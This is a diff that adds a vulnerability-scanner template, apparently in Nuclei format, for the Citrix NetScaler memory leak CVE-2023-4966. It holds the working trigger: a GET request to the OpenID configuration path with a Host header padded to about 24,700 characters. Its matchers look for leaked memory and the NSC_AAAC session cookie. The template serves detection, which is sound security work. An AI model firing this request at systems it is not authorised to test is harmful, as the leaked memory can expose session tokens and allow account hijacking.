@@ -1,0 +1,33 @@
+id: cve-2023-4966-citrix-memory-leak
+info:
+  name: Citrix Memory Information Leak Vulnerability (CVE-2023-4966)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2023-4966,netscaler,info-leak
+  description: |
+    This template detects the Citrix Memory Information Leak vulnerability (CVE-2023-4966) by sending a specially crafted request and analyzing the response for signs of leaked memory content.
+
+variables:
+  payload_host: '{{repeat("a", 24700)}}'
+
+http:
+  - raw:
+      - |
+        GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
+        Host: {{payload_host}}
+        User-Agent: 111
+        Accept: 111
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\x00\\x00\\x00\\x00"
+      - type: word
+        words:
+          - "NSC_AAAC"
+          - "\"issuer\""
+        condition: or
